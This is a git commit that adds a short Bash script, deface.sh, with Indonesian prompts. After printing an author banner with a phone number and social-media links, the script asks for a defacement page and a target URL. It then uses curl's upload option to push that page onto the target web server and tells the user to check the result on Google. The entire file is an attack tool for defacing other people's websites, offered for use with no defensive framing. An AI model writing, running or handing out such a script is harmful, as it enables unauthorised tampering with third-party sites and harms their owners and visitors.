5fb3f07a95b7060c693a847797b278ea41b04faa
darkcrack <64959098+darkcrack@users.noreply.github.com>
2020-05-12 11:29:40 +0700

    Add files via upload

---
+++ deface.sh
@@ -0,0 +1,18 @@
+clear
+figlet Deface
+echo
+echo
+echo "=========================/|\========================="
+echo "Author : darkcrack"
+echo "Wa : 082333537819"
+echo "Facebook : https://www.facebook.com/nolan.hanev.9"
+echo "Github : https://github.com/darkcrack"
+echo "=========================/|\========================="
+echo
+echo
+echo "PASTIKAN SCRIPT DEFACE DI LUAR FOLDER!"
+read -p "Masukkan script deface anda : " sc
+read -p "Masukkan targef deface : " t
+curl -T /sdcard/$sc $t
+echo "Cek di google : $t/$sc"
+
